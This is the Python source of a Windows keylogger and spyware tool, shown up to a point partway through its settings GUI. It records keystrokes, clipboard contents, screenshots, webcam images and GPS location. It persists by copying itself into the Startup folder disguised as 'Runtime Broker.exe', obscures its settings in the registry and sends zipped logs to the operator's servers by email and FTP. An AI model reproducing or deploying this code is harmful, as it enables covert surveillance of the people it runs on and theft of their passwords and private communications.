import io
import os
import cv2
import time
import base64
import ftplib
import shutil
import winreg
import random
import smtplib
import zipfile
import keyboard
import platform
import threading
import pyautogui
import pyperclip
import subprocess
import numpy as np
import tkinter as tk
import tkinter.font as font
import tkinter.messagebox as messagebox
import tkinter.scrolledtext as scrolledtext
from PIL import ImageTk, Image
from pynput import keyboard, mouse
from tkinter import ttk
from datetime import datetime, timedelta
from win32gui import GetWindowText, GetForegroundWindow
from tkcalendar import Calendar
from email.utils import COMMASPACE, formatdate
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

class RegEditor(object):
    def set_reg(self, reg_path_settings, name, value):
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path_settings)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path_settings, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
            return True
        except WindowsError:
            return False

    def get_reg(self, mode, reg_path_settings, name=None):
        if mode == 0:
            try:
                registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path_settings, 0, winreg.KEY_READ)
                value, regtype = winreg.QueryValueEx(registry_key, name)
                winreg.CloseKey(registry_key)
                return value
            except WindowsError:
                return None
        else: #read the whole key
            try:
                values = []
                registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path_settings, 0, winreg.KEY_READ)
                for i in range(winreg.QueryInfoKey(registry_key)[1]):
                    values.append(winreg.EnumValue(registry_key, i))
                winreg.CloseKey(registry_key)
                return values
            except WindowsError:
                return None

    def del_reg(self, mode, reg_path_settings, name=None):
        if mode == 0: # delete only value
            try:
                registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path_settings, 0, winreg.KEY_WRITE)
                winreg.DeleteValue(registry_key, name)
                winreg.CloseKey(registry_key)
                return True
            except WindowsError:
                return False
        else: #delete the whole key (use with caution)
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path_settings)
                return True
            except:
                return False

class CronJob(object):
    def __init__(self):
        self.reg_path = Config().reg_path_cronjob
        self.r = RegEditor()
        self.tasks = { #declare all Tasks here
            'send_email_1': Tools().send_email_1,
            'send_email_2': Tools().send_email_2,
            'upload_ftp_1': Tools().upload_ftp_1,
            'upload_ftp_2': Tools().upload_ftp_2,
        }
        self.halt = False
        threading.Thread(target=self.loop).start()

    def stop(self):
        self.halt = True
    
    def set_task(self, task, hour, minute=0):
        try:
            for item in self.r.get_reg(1, self.reg_path):
                exist_task = item[0]
                if task == exist_task:
                    #print('Task already exists!')
                    return
        except:
            pass
        interval = str(hour*60 + minute)
        self.r.set_reg(self.reg_path, str(task), interval+'|N/A|N/A')
        #print('Task created successfully!')
            
    def get_task(self):
        try:
            task_list = self.r.get_reg(1, self.reg_path)
        except:
            #print('Task list empty!')
            return
        for item in task_list:
            task = item[0]
            interval, last_run, status = item[1].split('|')
            interval = int(interval)
            if last_run == 'N/A':
                status = 'N/A'
            else:
                last_run = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(float(last_run)))
            #print('Task: ', task, ' | Interval: ', interval, ' | Last run: ', last_run, ' | Status: ', status)
            
    def delete_task(self, task):
        if self.r.del_reg(0, self.reg_path, task):
            #print('Task deleted successfully!')
            pass
        else:
            #print('Task not found!')
            pass
        
    def loop(self):
        def execute(task, interval):
            try:
                if self.tasks[task]() == True:
                    self.r.set_reg(self.reg_path, str(task), str(interval)+'|'+str(time.time())+'|success')
                    return True
                else:
                    self.r.set_reg(self.reg_path, str(task), str(interval)+'|'+str(time.time())+'|failed')
                    return False
            except Exception as e:
                #print(e)
                self.r.set_reg(self.reg_path, str(task), str(interval)+'|'+str(time.time())+'|failed')
                return False
            
        while True: #endless loop, put the whole def in threading
            if self.halt:
                #print('halted')
                break
            try:
                task_list = self.r.get_reg(1, self.reg_path)
            except:
                #print('Task list empty!')
                return
            if task_list == None:
                #print('Task list empty!')
                return
            for item in task_list:
                task = item[0]
                #print('Running:', task)
                interval, last_run, status = item[1].split('|')
                interval = int(interval)
                if last_run == 'N/A': #run for the first time, run immediately
                    status = 'success' if execute(task, interval)==True else 'failed'
                    last_run = time.time()
                else: #if has run before, check interval
                    last_run = float(last_run)
                    if time.time() - last_run >= interval*60:
                        status = 'success' if execute(task, interval)==True else 'failed'
                        last_run = time.time()

                last_run = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_run))
                #print('Task: ', task, ' | Interval: ', interval, ' | Last run: ', last_run, ' | Status: ', status)
            time.sleep(300) #delay around 5 mins (300) before next check

class VigenereCipher(object):
    def __init__(self):
        self.alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ '
        
    def encrypt(self, plaintext, key):
        try:
            key = base64.urlsafe_b64decode(key).decode()
        except:
            print('Invalid key')
            return False
        key_length = len(key)
        key_as_int = [ord(i) for i in key]
        plaintext_int = [ord(i) for i in plaintext]
        ciphertext = ''
        for i in range(len(plaintext_int)):
            value = (plaintext_int[i] - 32 + key_as_int[i % key_length]) % len(self.alphabet)
            ciphertext += chr(value + 32)
        ciphertext = base64.urlsafe_b64encode(ciphertext.encode()).decode()
        return ciphertext

    def decrypt(self, ciphertext, key):
        try:
            key = base64.urlsafe_b64decode(key).decode()
        except:
            print('Invalid key')
            return False
        ciphertext = base64.urlsafe_b64decode(ciphertext).decode()
        key_length = len(key)
        key_as_int = [ord(i) for i in key]
        ciphertext_int = [ord(i) for i in ciphertext]
        plaintext = ''
        for i in range(len(ciphertext_int)):
            value = (ciphertext_int[i] - 32 - key_as_int[i % key_length]) % len(self.alphabet)
            plaintext += chr(value + 32)
        return plaintext

class BasicFunction(object):
    def popup_msg(self, mode, title, msg):
        if mode == 0:
            messagebox.showinfo(str(title), str(msg))
        elif mode == 1:
            messagebox.showwarning(str(title), str(msg))
        elif mode == 2:
            messagebox.showerror(str(title), str(msg))
            
    def spawn(self):
        file_name = 'Runtime Broker.exe'
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', file_name)
        if not os.path.isfile(startup):
            try:
                shutil.copy(file_name, startup)
            except Exception as e:
                #print(e)
                pass

class Config(object):
    def __init__(self):
        self.reg_path_settings = r"SOFTWARE\Keylogger\Settings"
        self.reg_path_cronjob = r"SOFTWARE\Keylogger\Task"
        working_dir = os.getcwd()
        self.r = RegEditor()
        self.v = VigenereCipher()
        #environ
        self.tmp_path = 'KeyloggerReport'
        self.tmp_path = os.path.join(os.environ['TMP'], self.tmp_path)
        #settings
        self.log_path = str(self.r.get_reg(0, self.reg_path_settings, '2193581253')) if self.r.get_reg(0, self.reg_path_settings, '2193581253')\
                        else str(os.path.join(working_dir, 'log',))
        self.screenshot_path = str(self.r.get_reg(0, self.reg_path_settings, '7235698253')) if self.r.get_reg(0, self.reg_path_settings, '7235698253')\
                               else str(os.path.join(working_dir, 'screenshot',))
        self.camera_path = str(self.r.get_reg(0, self.reg_path_settings, '9874682374')) if self.r.get_reg(0, self.reg_path_settings, '9874682374')\
                           else str(os.path.join(working_dir, 'camera',))
        self.screenshot_interval = int(self.r.get_reg(0, self.reg_path_settings, '5735638464')) if self.r.get_reg(0, self.reg_path_settings, '5735638464')\
                                   else 15
        self.camera_interval = int(self.r.get_reg(0, self.reg_path_settings, '3889734234')) if self.r.get_reg(0, self.reg_path_settings, '3889734234')\
                               else 15
        #settings button
        self.keyboard_enabled = str(self.r.get_reg(0, self.reg_path_settings, '9347182837')) if self.r.get_reg(0, self.reg_path_settings, '9347182837')\
                                else 'ON'
        self.clipboard_enabled = str(self.r.get_reg(0, self.reg_path_settings, '8291837491')) if self.r.get_reg(0, self.reg_path_settings, '8291837491')\
                                 else 'OFF'
        self.gps_enabled = str(self.r.get_reg(0, self.reg_path_settings, '2838192953')) if self.r.get_reg(0, self.reg_path_settings, '2838192953')\
                           else 'OFF'
        self.screenshot_enabled = str(self.r.get_reg(0, self.reg_path_settings, '5739172019')) if self.r.get_reg(0, self.reg_path_settings, '5739172019')\
                                  else 'OFF'
        self.camera_enabled = str(self.r.get_reg(0, self.reg_path_settings, '7329381723')) if self.r.get_reg(0, self.reg_path_settings, '7329381723')\
                              else 'OFF'                      
        #encrypt key
        self.vigenere_key = 'QnFoLHpQdyBRRjlYOkdXKVlbM0luYTVPPidmbm8iUCtIXC9GSl0hPFomQ3pwflUybyVVXHZIJTtGOk0oXkUyVDZu'
        
        #send email report
        self.sender_email = str(self.r.get_reg(0, self.reg_path_settings, '8192759123')) if self.r.get_reg(0, self.reg_path_settings, '8192759123')\
                              else ''
        self.sender_email = self.v.decrypt(self.sender_email, self.vigenere_key)
        self.sender_password = str(self.r.get_reg(0, self.reg_path_settings, '7382937492')) if self.r.get_reg(0, self.reg_path_settings, '7382937492')\
                              else ''
        self.sender_password = self.v.decrypt(self.sender_password, self.vigenere_key)
        self.receiver_email = str(self.r.get_reg(0, self.reg_path_settings, '2346457834')) if self.r.get_reg(0, self.reg_path_settings, '2346457834')\
                              else ''
        self.receiver_email = self.v.decrypt(self.receiver_email, self.vigenere_key)
        self.smtp_server = str(self.r.get_reg(0, self.reg_path_settings, '1738592734')) if self.r.get_reg(0, self.reg_path_settings, '1738592734')\
                           else self.v.encrypt('smtp.gmail.com', self.vigenere_key)
        self.smtp_server = self.v.decrypt(self.smtp_server, self.vigenere_key)
        self.smtp_port = str(self.r.get_reg(0, self.reg_path_settings, '9284917234')) if self.r.get_reg(0, self.reg_path_settings, '9284917234')\
                           else self.v.encrypt(str(587), self.vigenere_key)
        self.smtp_port = int(self.v.decrypt(self.smtp_port, self.vigenere_key))
        self.email_interval_1 = int(self.r.get_reg(0, self.reg_path_settings, '2393841293')) if self.r.get_reg(0, self.reg_path_settings, '2393841293')\
                              else 1
        self.email_interval_2 = int(self.r.get_reg(0, self.reg_path_settings, '1029385762')) if self.r.get_reg(0, self.reg_path_settings, '1029385762')\
                              else 3
        #upload ftp report
        self.ftp_username = str(self.r.get_reg(0, self.reg_path_settings, '5738192731')) if self.r.get_reg(0, self.reg_path_settings, '5738192731')\
                              else ''
        self.ftp_username = self.v.decrypt(self.ftp_username, self.vigenere_key)
        self.ftp_password = str(self.r.get_reg(0, self.reg_path_settings, '7365819274')) if self.r.get_reg(0, self.reg_path_settings, '7365819274')\
                              else ''
        self.ftp_password = self.v.decrypt(self.ftp_password, self.vigenere_key)
        self.ftp_server_path = str(self.r.get_reg(0, self.reg_path_settings, '6748263916')) if self.r.get_reg(0, self.reg_path_settings, '6748263916')\
                              else self.v.encrypt('/', self.vigenere_key)
        self.ftp_server_path = self.v.decrypt(self.ftp_server_path, self.vigenere_key)
        self.ftp_server = str(self.r.get_reg(0, self.reg_path_settings, '1827395812')) if self.r.get_reg(0, self.reg_path_settings, '1827395812')\
                              else ''
        self.ftp_server = self.v.decrypt(self.ftp_server, self.vigenere_key)
        self.ftp_port = str(self.r.get_reg(0, self.reg_path_settings, '8192736412')) if self.r.get_reg(0, self.reg_path_settings, '8192736412')\
                              else self.v.encrypt(str(21), self.vigenere_key)
        self.ftp_port = int(self.v.decrypt(self.ftp_port, self.vigenere_key))
        self.ftp_interval_1 = int(self.r.get_reg(0, self.reg_path_settings, '8519381032')) if self.r.get_reg(0, self.reg_path_settings, '8519381032')\
                              else 1
        self.ftp_interval_2 = int(self.r.get_reg(0, self.reg_path_settings, '4182958123')) if self.r.get_reg(0, self.reg_path_settings, '4182958123')\
                              else 3

class GatherLog(object):
    def __init__(self, n_days_ago, file_name='report.zip'):
        log_path = Config().log_path
        screenshot_path = Config().screenshot_path
        camera_path = Config().camera_path
        tmp_path = Config().tmp_path
        start = int((datetime.now() - timedelta(days=n_days_ago)).strftime("%Y%m%d"))
        end = int(datetime.now().strftime("%Y%m%d"))+1
        date_range = list(map(str, list(range(start, end))))

        if not os.path.isdir(os.path.join(tmp_path, os.path.basename(log_path))):
            os.makedirs(os.path.join(tmp_path, os.path.basename(log_path)))
            
        if os.path.isdir(log_path):
            for file in os.listdir(log_path):
                if os.path.isfile(os.path.join(log_path, file)) and os.path.splitext(file)[0] in date_range:
                    #print(file)
                    shutil.copy(os.path.join(log_path, file), os.path.join(tmp_path, os.path.basename(log_path), file))
        if os.path.isdir(screenshot_path):
            for folder in os.listdir(screenshot_path):
                if os.path.isdir(os.path.join(screenshot_path, folder)) and folder in date_range:
                    #print(folder)
                    shutil.copytree(os.path.join(screenshot_path, folder), os.path.join(tmp_path, os.path.basename(screenshot_path), folder), dirs_exist_ok=True)
        if os.path.isdir(camera_path):
            for folder in os.listdir(camera_path):
                if os.path.isdir(os.path.join(camera_path, folder)) and folder in date_range:
                    #print(folder)
                    shutil.copytree(os.path.join(camera_path, folder), os.path.join(tmp_path, os.path.basename(camera_path), folder), dirs_exist_ok=True)
        sys_info = platform.uname()
        with open(os.path.join(tmp_path, 'sys_info.txt'), 'w+') as f:
            f.write('OS: ' + sys_info.system + ' ' + sys_info.version + ' ' + sys_info.machine + \
                    '\nComputer Name: ' + sys_info.node + '\nUser: ' + os.environ['USERNAME'])
        with zipfile.ZipFile(file_name, 'w') as z:
            for folder in [x[0] for x in os.walk(tmp_path)]:
                for file in os.listdir(folder):
                    #print(file)
                    if os.path.isfile(os.path.join(folder, file)):
                        z.write(os.path.join(folder, file))
        shutil.rmtree(tmp_path)
        
class Keylogger(object):    
    def __init__(self, reset=False):
        keyboard_enabled = True if Config().keyboard_enabled=="ON" else False
        clipboard_enabled = True if Config().clipboard_enabled=="ON" else False
        gps_enabled = True if Config().gps_enabled=="ON" else False
        screenshot_enabled = True if Config().screenshot_enabled=="ON" else False
        camera_enabled = True if Config().camera_enabled=="ON" else False
        
        self.log_path = str(Config().log_path)
        self.camera_path = str(Config().camera_path)
        self.screenshot_path = str(Config().screenshot_path)
        
        self.log_filename = os.path.join(self.log_path, str(datetime.now().strftime("%Y%m%d"))+'.txt')

        #time between 2 capture
        self.read_clipboard_interval = 0.5
        self.read_gps_interval = 300
        self.read_screenshot_interval = int(Config().screenshot_interval)*60
        self.read_camera_interval = int(Config().camera_interval)*60
        
        #print(self.log_path, self.camera_path, self.screenshot_path, self.read_screenshot_interval, self.read_camera_interval)

        #timer to check
        self.t_keyboard = 0
        self.t_clipboard = 0
        self.t_gps = 0
        self.t_screenshot = 0
        self.t_camera = 0

        self.mouse_clicked = False
        self.seq = ''
        self.cam_list = []
        self.prev_window = ''
        self.prev_clipboard = ''
        
        self.halt = False # False = run | True = stop

        #remove all folder is reset is True
        if reset:
            self.clear_log()

        if camera_enabled:
            self.cam_list = self.get_camera_list()
        self.run(keyboard_enabled, clipboard_enabled, screenshot_enabled, camera_enabled, gps_enabled)

    def clear_log(self, clear_all=False):
        if os.path.isdir(self.camera_path):
            shutil.rmtree(self.camera_path)
        if os.path.isdir(self.screenshot_path):
            shutil.rmtree(self.screenshot_path)
        if os.path.isdir(self.log_path):
            shutil.rmtree(self.log_path)

    def run(self, keyboard_enabled=True, clipboard_enabled=True, screenshot_enabled=True, camera_enabled=True, gps_enabled=True):
        if keyboard_enabled:
            self.read_mouse()
            self.read_keyboard()
        if gps_enabled:
            if not self.read_gps(init=True):
                gps_enabled = False
        while True:
            if self.halt:
                GUI()
                break
            else:
                if time.time() - self.t_clipboard >= self.read_clipboard_interval and clipboard_enabled: #clipboard
                    self.t_clipboard = time.time()
                    clipboard = self.read_clipboard()
                    if clipboard != '':
                        self.write_log_file('\n------------------------------------\n[CLIPBOARD]:\n' + str(clipboard) + '\n------------------------------------\n') #save to file

                if time.time() - self.t_gps >= self.read_gps_interval and gps_enabled: #GPS
                    self.t_gps = time.time()
                    self.read_gps()
                if time.time() - self.t_screenshot >= self.read_screenshot_interval and screenshot_enabled: #screenshot
                    self.t_screenshot = time.time()
                    self.read_screenshot()
                if time.time() - self.t_camera >= self.read_camera_interval and camera_enabled: #camera
                    self.t_camera = time.time()
                    self.read_camera()
                    
                time.sleep(min(self.read_clipboard_interval,
                               self.read_screenshot_interval, self.read_camera_interval)) #delay before other capture


    def get_camera_list(self): #capture camera from all available cams (10 cams, from 0-9)
        cam_list = []
        min_index = 0
        max_index = 10
        for i in range(min_index, max_index):
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
            if cap.read()[0]:
                cam_list.append(i)
                cap.release()
        return cam_list
    
    def read_gps(self, init=False):
        try:
            pshellcomm = ['powershell']
            pshellcomm.append('Add-Type -AssemblyName System.Device;'\
                              '$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher;'\
                              '$GeoWatcher.Start();'\
                              'while (($GeoWatcher.Status -ne "Ready") -and ($GeoWatcher.Permission -ne "Denied"))'\
                              '{Start-Sleep -Milliseconds};'\
                              'if ($GeoWatcher.Permission -eq "Denied")'\
                              '{Write-Error "Access Denied for Location Information"}'\
                              'else'\
                              '{$GeoWatcher.Position.Location}')
            output, err = subprocess.Popen(pshellcomm,
                                           stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                           text=True, creationflags=0x08000000).communicate()
            output = output.split('\n')
            output = output[::-1] #result are more likely to be at the end of the output, flip output to shorten runtime
            #print(output)
            lat, lon = 0, 0
            for line in output:
                line = line.replace('\n', '')
                if line == '':
                    continue
                if 'Latitude' in line:
                    lat = float(line[line.find(': ')+2:])
                if 'Longitude' in line:
                    lon = float(line[line.find(': ')+2:])
                if lat != 0 and lon != 0:
                    self.write_log_file('\n------------------------------------\n[LAT:' + str(lat) + ' | LON:' + str(lon) +\
                                        ']\n------------------------------------\n') #save to file
                    break
            if init:
                return True #decide to log GPS or not
        except Exception as e:
            #print(e)
            if init:
                return False #decide to log GPS or not
            
    def read_screenshot(self):
        try:
            #pyautogui does not capture mouse
            img = pyautogui.screenshot() #capture screenshot
            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            (x,y) = pyautogui.position() #get mouse pos
            mouse_pos = img.copy() #copy to draw mouse position
            mouse_pos = cv2.circle(mouse_pos, (x,y), 11, (0,0,0), 3) #draw mouse position
            mouse_pos = cv2.circle(mouse_pos, (x,y), 10, (0,255,0), -1) #draw mouse position
            img = cv2.addWeighted(mouse_pos, 0.5, img, 0.5, 0) #show mouse position but a little bit fade
            if not os.path.isdir(os.path.join(self.screenshot_path, str(datetime.now().strftime("%Y%m%d")))):
                os.makedirs(os.path.join(self.screenshot_path, str(datetime.now().strftime("%Y%m%d"))))
            cv2.imwrite(os.path.join(self.screenshot_path, str(datetime.now().strftime("%Y%m%d")),\
                                     str(datetime.now().strftime("%Y%m%d%H%M%S"))+'.jpg'), img)
        except:
            pass
        
    def read_camera(self):
        for i in self.cam_list: #read all cameras
            try:
                cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
                ret, img = cap.read()
                cap.release()
                if not ret:
                    continue
                if not os.path.isdir(os.path.join(self.camera_path, str(datetime.now().strftime("%Y%m%d")))):
                    os.makedirs(os.path.join(self.camera_path, str(datetime.now().strftime("%Y%m%d"))))
                cv2.imwrite(os.path.join(self.camera_path, str(datetime.now().strftime("%Y%m%d")),\
                                         str(datetime.now().strftime("%Y%m%d%H%M%S"))+'_'+str(i)+'.jpg'), img)
            except:
                pass
        
    def read_clipboard(self):
        clipboard = pyperclip.paste()
        #remove this if can detect Ctrl + C
        if clipboard != self.prev_clipboard: #if different then return data, else return empty string
            self.prev_clipboard = clipboard
            return clipboard
        else:
            return ''

    def read_keyboard(self):
        COMBINATIONS = [{keyboard.Key.shift_l, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift_r}]
        current = set()
        def on_press(key):
            if any([key in COMBO for COMBO in COMBINATIONS]):
                current.add(key)
                if any(all(k in current for k in COMBO) for COMBO in COMBINATIONS): #popup GUI
                    self.halt = True
                    return False
            try:
                c = str(key.char)
            except AttributeError:
                c = str(key).replace('Key.', '')
                if c == 'space':
                    c = ' '
                else:
                    c = '[' + str(c) + ']'
            current_window = GetWindowText(GetForegroundWindow())
            if current_window != self.prev_window:
                self.write_log_file('\n------------------------------------\n[' + str(current_window) + ']:\n') #save to file
                self.prev_window = current_window
            
            self.mouse_clicked = False
            self.write_log_file(str(c)) #save to file
        def on_release(key):
            try:
                current.remove(key)
            except:
                pass
            
        keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        keyboard_listener.start()

    def read_mouse(self):
        def on_click(x, y, button, pressed):
            if self.halt:
                return False
            if pressed and not self.mouse_clicked:
                self.write_log_file('\n') #save to file
                self.mouse_clicked = True

        mouse_listener = mouse.Listener(on_click=on_click)
        mouse_listener.start()

    def write_log_file(self, text):
        if not os.path.isdir(self.log_path):
            os.makedirs(self.log_path)
        f = open(self.log_filename, 'a+', encoding='utf-8')
        f.write(str(text))
        f.close()
        
class Tools(object):
    def send_email_1(self): #to call parameters
        email_interval_1 = str(Config().email_interval_1)
        if email_interval_1 == '1':
            n_days_ago = 7 #report startup 7 days
        elif email_interval_1 == '2':
            n_days_ago = 1 #1 day
        elif email_interval_1 == '3':
            n_days_ago = 3 #3 days
        elif email_interval_1 == '4':
            n_days_ago = 7 #1 week
        file_name = 'report-email-'+(datetime.now() - timedelta(days=n_days_ago)).strftime("%Y%m%d")+'-'+datetime.now().strftime("%Y%m%d")+'.zip'
        #print(email_interval_1, n_days_ago, file_name)
        return self.send_email(n_days_ago, file_name)
    def send_email_2(self):
        email_interval_2 = str(Config().email_interval_2)
        if email_interval_2 == '1':
            n_days_ago = 7 #report startup 7 days
        elif email_interval_2 == '2':
            n_days_ago = 1 #1 day
        elif email_interval_2 == '3':
            n_days_ago = 3 #3 days
        elif email_interval_2 == '4':
            n_days_ago = 7 #1 week
        file_name = 'report-email-'+(datetime.now() - timedelta(days=n_days_ago)).strftime("%Y%m%d")+'-'+datetime.now().strftime("%Y%m%d")+'.zip'
        #print(email_interval_2, n_days_ago, file_name)
        return self.send_email(n_days_ago, file_name)
    def send_email(self, n_days_ago=0, file_name=None):
        try:
            if n_days_ago == 0 and file_name == None:
                tmp_path = Config().tmp_path
                file_name = os.path.join(tmp_path, 'test-keylogger.txt')
                if not os.path.isdir(tmp_path):
                    os.makedirs(tmp_path)
                with open(file_name, 'w+') as f:
                    f.write("Congratulations! If you're seeing this, you've successfully set up Email report for you Keylogger.")
            else:
                file_name = os.path.join(os.environ['TMP'], file_name)
                GatherLog(n_days_ago, file_name)
            server = Config().smtp_server
            port = Config().smtp_port
            sender = Config().sender_email
            password = Config().sender_password
            receiver = Config().receiver_email
            subject = 'Keylogger Logs' #add date
            sys_info = platform.uname()
            body = 'OS: ' + sys_info.system + ' ' + sys_info.version + ' ' + sys_info.machine + \
                   '\nComputer Name: ' + sys_info.node + '\nUser: ' + os.environ['USERNAME']
            files = [file_name]
                
            session = smtplib.SMTP(server, port)        
            session.ehlo()
            session.starttls()
            session.ehlo()
            session.login(sender, password)
            session = session
            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Date'] = formatdate(localtime=True)
            msg['Subject'] = subject
            msg.attach(MIMEText(body))
            for file in files:
                f = open(file, "rb")
                part = MIMEApplication(f.read(), Name=os.path.basename(file))
                part['Content-Disposition'] = 'attachment; filename="%s"' % os.path.basename(file)
                msg.attach(part)
                f.close()
            session.sendmail(sender, receiver, msg.as_string())
            if n_days_ago == 0 and file_name == None:
                os.remove(os.path.join(tmp_path, 'test-keylogger.txt'))
            else:
                os.remove(file_name)
            return True
        except Exception as e:
            #print(e)
            return str(e)
        
    def upload_ftp_1(self): #to call parameters
        ftp_interval_1 = str(Config().ftp_interval_1)
        if ftp_interval_1 == '1':
            n_days_ago = 7 #report startup 7 days
        elif ftp_interval_1 == '2':
            n_days_ago = 1 #1 day
        elif ftp_interval_1 == '3':
            n_days_ago = 3 #3 days
        elif ftp_interval_1 == '4':
            n_days_ago = 7 #1 week
        file_name = 'report-ftp-'+(datetime.now() - timedelta(days=n_days_ago)).strftime("%Y%m%d")+'-'+datetime.now().strftime("%Y%m%d")+'.zip'
        #print(ftp_interval_1, n_days_ago, file_name)
        return self.upload_ftp(n_days_ago, file_name)
    def upload_ftp_2(self):
        ftp_interval_2 = str(Config().ftp_interval_2)
        if ftp_interval_2 == '1':
            n_days_ago = 7 #report startup 7 days
        elif ftp_interval_2 == '2':
            n_days_ago = 1 #1 day
        elif ftp_interval_2 == '3':
            n_days_ago = 3 #3 days
        elif ftp_interval_2 == '4':
            n_days_ago = 7 #1 week
        file_name = 'report-ftp-'+(datetime.now() - timedelta(days=n_days_ago)).strftime("%Y%m%d")+'-'+datetime.now().strftime("%Y%m%d")+'.zip'
        #print(ftp_interval_2, n_days_ago, file_name)
        return self.upload_ftp(n_days_ago, file_name)
    def upload_ftp(self, n_days_ago=0, file_name=None):
        try:
            if n_days_ago == 0 and file_name == None:
                tmp_path = Config().tmp_path
                file_name = os.path.join(tmp_path, 'test-keylogger.txt')
                if not os.path.isdir(tmp_path):
                    os.makedirs(tmp_path)
                with open(file_name, 'w+') as f:
                    f.write("Congratulations! If you're seeing this, you've successfully set up FTP report for you Keylogger.")
            else:
                file_name = os.path.join(os.environ['TMP'], file_name)
                GatherLog(n_days_ago, file_name)    
            server = Config().ftp_server
            port = Config().ftp_port
            username = Config().ftp_username
            password = Config().ftp_password
            server_path = Config().ftp_server_path
            files = [file_name]
            
            for file in files:
                #print(file)
                ftp = ftplib.FTP()
                ftp.connect(server, port)
                ftp.login(username, password)
                ftp.cwd(server_path)
                def keep_alived(file, ftp):
                    f = open(file, 'rb')
                    ftp.storbinary('STOR ' + os.path.basename(file), f)
                    f.close()
                t = threading.Thread(target=keep_alived, args=(file, ftp))
                t.start()
                while t.is_alive():
                    t.join(60)
                    ftp.voidcmd('NOOP')
                ftp.close()
            if n_days_ago == 0 and file_name == None:
                os.remove(os.path.join(tmp_path, 'test-keylogger.txt'))
            else:
                os.remove(file_name)
            return True
        except Exception as e:
            #print(e)
            return str(e)

class Email(object):
    def __init__(self, root):
        self.root = root
        self.render()
        
    def save_settings(self):
        reg_path_settings = Config().reg_path_settings
        r = Config().r
        r.set_reg(reg_path_settings, '8192759123', Config().v.encrypt(str(self.text_field_1.get()), Config().vigenere_key)) #sender_email
        r.set_reg(reg_path_settings, '7382937492', Config().v.encrypt(str(self.text_field_2.get()), Config().vigenere_key)) #sender_password
        r.set_reg(reg_path_settings, '2346457834', Config().v.encrypt(str(self.text_field_3.get()), Config().vigenere_key)) #receiver_email
        r.set_reg(reg_path_settings, '1738592734', Config().v.encrypt(str(self.text_field_4.get()), Config().vigenere_key)) #smtp_server
        if not str(self.text_field_5.get()).isdigit():
            BasicFunction().popup_msg(2, 'Error', 'Invalid SMTP Port!')
            return False
        r.set_reg(reg_path_settings, '9284917234', Config().v.encrypt(str(self.text_field_5.get()), Config().vigenere_key)) #smtp_port
        email_interval_1 = str(self.op_1.get())
        if email_interval_1 == 'Never':
            c.delete_task('send_email_1')
            email_interval_1 = 0
        elif email_interval_1 == 'At Startup':
            email_interval_1 = 1
        elif email_interval_1 == 'Once a day':
            email_interval_1 = 2
        elif email_interval_1 == 'Once every 3 days':
            email_interval_1 = 3
        elif email_interval_1 == 'Once a week':
            email_interval_1 = 4
        r.set_reg(reg_path_settings, '2393841293', str(email_interval_1)) #email_interval_1
        email_interval_2 = str(self.op_2.get())
        if email_interval_2 == 'Never':
            c.delete_task('send_email_2')
            email_interval_2 = 0
        elif email_interval_2 == 'At Startup':
            email_interval_2 = 1
        elif email_interval_2 == 'Once a day':
            email_interval_2 = 2
        elif email_interval_2 == 'Once every 3 days':
            email_interval_2 = 3
        elif email_interval_2 == 'Once a week':
            email_interval_2 = 4
        r.set_reg(reg_path_settings, '1029385762', str(email_interval_2)) #email_interval_2
        return True
        
    def send_email(self):
        self.apply_button.config(state='disabled')
        def run():
            status = Tools().send_email()
            if status == True:
                #set cronjob
                #read config
                email_interval_1 = str(Config().email_interval_1)
                email_interval_2 = str(Config().email_interval_2)                
                if email_interval_1 == '0':
                    email_interval_1 = -2
                elif email_interval_1 == '1':
                    email_interval_1 = -1
                elif email_interval_1 == '2':
                    email_interval_1 = 24
                elif email_interval_1 == '3':
                    email_interval_1 = 72
                elif email_interval_1 == '4':
                    email_interval_1 = 168
                    
                if email_interval_2 == '0':
                    email_interval_2 = -2
                elif email_interval_2 == '1':
                    email_interval_2 = -1
                elif email_interval_2 == '2':
                    email_interval_2 = 24
                elif email_interval_2 == '3':
                    email_interval_2 = 72
                elif email_interval_2 == '4':
                    email_interval_ = 168

                c.delete_task('send_email_1')
                c.delete_task('send_email_2')
                #task 1
                if email_interval_1 > 0:
                    c.set_task('send_email_1', email_interval_1) #if not at startup or never
                #task 2
                if email_interval_2 > 0:
                    c.set_task('send_email_2', email_interval_2) #if not at startup or never
                
                self.msg.config(state='normal')
                self.msg.config(fg='green')
                self.msg.delete(0, tk.END)
                self.msg.insert(0, 'Success!')
                self.msg.config(state='readonly')
            else:
                if 'Username and Password not accepted.' in status:
                    status = 'Username and Password not accepted.'
                elif 'Application-specific password required' in status:
                    status = 'Access denied. Please Disable Two-factor Authentication, Allow Less Secure Apps, Unlock Captcha.'
                elif 'getaddrinfo failed' in status or 'established connection failed' in status or 'No connection could be made' in status:
                    status = 'Cannot connect to server.'
                elif 'Cannot create report!' in status:
                    status = 'Cannot create report!'
                else:
                    status = 'Unknown error occurred! Please try again later.'
                self.msg.config(state='normal')
                self.msg.config(fg='red')
                self.msg.delete(0, tk.END)
                self.msg.insert(0, 'Error: ' + str(status))
                self.msg.config(state='readonly')
            self.apply_button.config(state='normal')

